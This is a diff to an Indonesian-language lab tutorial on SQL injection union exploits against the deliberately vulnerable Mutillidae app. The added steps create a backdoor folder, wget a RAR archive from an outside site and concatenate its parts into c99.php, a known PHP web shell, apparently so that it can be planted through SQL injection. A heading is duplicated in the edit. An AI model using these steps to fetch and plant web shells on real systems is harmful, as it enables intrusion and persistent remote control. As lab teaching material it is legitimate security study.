@@ -1,6 +1,29 @@
 ## Lesson 11 - SQL Injection Union Exploit \#4
 
-### \# Inject Backdoor di halaman User Info
+### \# Mendownload c99.php (PHP SQL Injection)
+
+* **Step 1** : Download file, lakukan command berikut
+```
+mkdir -p /root/backdoor
+cd /root/backdoor/
+wget http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson11/stuff.rar
+ls -lrta
+```
+![](/assets/lesson-11/lesson11_1.JPG)
+
+* **Step 2** : Unrar file dan gabungkan menjadi script, lakukan command berikut
+```
+unrar x stuff.rar
+cat part1.txt part2.txt part3.txt > c99.php
+cp c99.php c99.php.bkp
+ls -lrta
+```
+![](/assets/lesson-11/lesson11_2.JPG)
+
+
+
+
+### \# Mendownload c99.php (PHP SQL Injection)
 
 * **Step 1** : Buka `http://10.151.36.64/mutillidae/` lalu masuk ke halaman user info. Pilih sidebar. OWASP Top 10 --&gt; A1 - SQL Injection --&gt; SQLi - Extract Data --&gt; User Info
   ![](/assets/lesson-7/VirtualBox_kali_19_12_2017_03_01_34.png)
